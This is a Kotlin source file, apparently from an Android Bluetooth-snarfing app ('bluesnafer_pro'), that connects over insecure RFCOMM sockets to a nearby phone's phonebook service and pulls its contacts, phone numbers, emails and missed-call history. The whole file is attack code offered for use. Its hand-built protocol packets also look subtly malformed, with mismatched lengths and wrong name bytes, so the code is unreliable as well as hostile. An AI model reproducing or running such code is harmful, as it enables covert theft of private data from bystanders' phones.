package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.Executors

/**
 * Real PBAP (Phone Book Access Profile) client for extracting contacts and call history
 */
object PBAPExtractor {
    private const val TAG = "PBAPExtractor"
    private val PBAP_UUID = UUID.fromString("0000112F-0000-1000-8000-00805F9B34FB")
    private val executor = Executors.newCachedThreadPool()
    
    /**
     * Extract contacts from device
     */
    fun extractContacts(device: BluetoothDevice): List<Map<String, String>> {
        Log.d(TAG, "Extracting contacts from ${device.address}")
        val contacts = mutableListOf<Map<String, String>>()
        
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(PBAP_UUID)
            socket.connect()
            Log.d(TAG, "PBAP connected for contacts")
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // PBAP Connect
            val connectPacket = byteArrayOf(
                0x80.toByte(), // Connect
                0x00, 0x10, // Length: 16
                0x10, // PBAP version 1.0
                0x00, // Flags
                0x00, 0x00, // Max packet length (will be set)
                0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Reserved
            )
            
            output.write(connectPacket)
            output.flush()
            Thread.sleep(200)
            
            val connectResponse = ByteArray(1024)
            val connBytes = input.read(connectResponse)
            
            if (connBytes > 0 && (connectResponse[0].toInt() and 0xFF) == 0xA0) {
                Log.d(TAG, "PBAP connected successfully")
                
                // Request contact list (vCard 2.1 format)
                val pullVcardListing = byteArrayOf(
                    0xC6.toByte(), // PullvCardListing
                    0x00, 0x08, // Length
                    0x01, // Name header
                    0x00, 0x05, // Length
                    0x00, 0x00, 0x00 // Empty name = root
                )
                
                output.write(pullVcardListing)
                output.flush()
                Thread.sleep(300)
                
                val listingResponse = ByteArray(8192)
                val listBytes = input.read(listingResponse)
                
                if (listBytes > 0) {
                    val vcardData = String(listingResponse, 0, listBytes, Charsets.UTF_8)
                    Log.d(TAG, "Received ${listBytes} bytes of vCard data")
                    
                    // Parse vCard entries
                    val lines = vcardData.split("\n")
                    var currentContact = mutableMapOf<String, String>()
                    
                    for (line in lines) {
                        val trimmed = line.trim()
                        when {
                            trimmed.startsWith("BEGIN:VCARD") -> {
                                currentContact = mutableMapOf()
                            }
                            trimmed.startsWith("FN:") -> {
                                currentContact["name"] = trimmed.substringAfter("FN:").trim()
                            }
                            trimmed.startsWith("TEL:") || trimmed.startsWith("TEL;") -> {
                                val phone = trimmed.substringAfter(":").trim()
                                if (currentContact["phone"].isNullOrEmpty()) {
                                    currentContact["phone"] = phone
                                } else {
                                    currentContact["phone2"] = phone
                                }
                            }
                            trimmed.startsWith("EMAIL:") || trimmed.startsWith("EMAIL;") -> {
                                currentContact["email"] = trimmed.substringAfter(":").trim()
                            }
                            trimmed.startsWith("END:VCARD") -> {
                                if (currentContact.isNotEmpty() && currentContact["name"]?.isNotEmpty() == true) {
                                    contacts.add(currentContact.toMap())
                                }
                            }
                        }
                    }
                }
            }
            
            socket.close()
            Log.d(TAG, "Extracted ${contacts.size} contacts")
            contacts
        } catch (e: Exception) {
            Log.e(TAG, "PBAP contacts error: ${e.message}")
            emptyList()
        }
    }
    
    /**
     * Extract call history from device
     */
    fun extractCallHistory(device: BluetoothDevice): List<Map<String, Any>> {
        Log.d(TAG, "Extracting call history from ${device.address}")
        val calls = mutableListOf<Map<String, Any>>()
        
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(PBAP_UUID)
            socket.connect()
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // Connect
            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x10, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
            output.flush()
            input.read(ByteArray(1024))
            
            // Request call log (using specific PBAP filters)
            val pullVcardEntry = byteArrayOf(
                0xC7.toByte(), // PullvCardEntry
                0x00, 0x0C, // Length
                0x01, // Name header
                0x00, 0x09, // Length
                0x00, 0x00, 0x00, 0x03, // "mch" = missed calls history
                0x42, // Type header
                0x00, 0x03, // Length
                0x00, 0x00, 0x01 // Call log type
            )
            
            output.write(pullVcardEntry)
            output.flush()
            Thread.sleep(300)
            
            val entryResponse = ByteArray(8192)
            val entryBytes = input.read(entryResponse)
            
            if (entryBytes > 0) {
                val data = String(entryResponse, 0, entryBytes, Charsets.UTF_8)
                val lines = data.split("\n")
                
                for (line in lines) {
                    val trimmed = line.trim()
                    if (trimmed.startsWith("TEL:")) {
                        val phone = trimmed.substringAfter("TEL:").trim()
                        calls.add(mapOf(
                            "phone" to phone,
                            "type" to "unknown",
                            "date" to "N/A"
                        ))
                    }
                }
            }
            
            socket.close()
            Log.d(TAG, "Extracted ${calls.size} call records")
            calls
        } catch (e: Exception) {
            Log.e(TAG, "PBAP call history error: ${e.message}")
            emptyList()
        }
    }
    
    /**
     * Extract by type - wrapper method
     */
    fun extract(device: BluetoothDevice, type: String): Map<String, Any> {
        Log.d(TAG, "Extracting: $type")
        return when (type.lowercase()) {
            "contacts" -> {
                val contacts = extractContacts(device)
                mapOf("success" to true, "contacts" to contacts, "contactCount" to contacts.size)
            }
            "calls", "call_history" -> {
                val calls = extractCallHistory(device)
                mapOf("success" to true, "calls" to calls, "callCount" to calls.size)
            }
            else -> extractAll(device)
        }
    }
    
    /**
     * Extract both contacts and calls (all)
     */
    fun extractAll(device: BluetoothDevice): Map<String, Any> {
        val contacts = extractContacts(device)
        val calls = extractCallHistory(device)
        
        return mapOf(
            "success" to true,
            "contacts" to contacts,
            "calls" to calls,
            "contactCount" to contacts.size,
            "callCount" to calls.size
        )
    }
}
